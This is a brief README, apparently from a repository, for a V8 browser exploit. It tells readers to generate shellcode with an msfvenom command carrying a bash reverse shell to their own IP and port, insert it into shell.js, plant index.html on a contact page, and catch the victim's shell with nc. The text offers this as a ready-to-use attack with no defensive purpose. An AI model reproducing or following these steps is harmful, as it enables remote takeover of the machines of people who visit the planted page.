# v8 Exploitation
This is a basic browser exploitation 😉

》 Clone the two files 
》 Edit your ip and server port on index.html 
》 Your need to change the shell code on shell.js file on line 95
》 To create your shell code:
  $msfvenom -p linux/x64/exec -f num CMD='bash -c "bash -i >& /dev/tcp/ip/port 0>&1"'
   
》 Make sure you changed the shell code on line 95 😉
》 Start a python server and paste the index.html code in that contact page
》 Now check your nc you'll get a shell 

HaveFun:) Follow me for more awesome stuffs and if you liked this give a star *
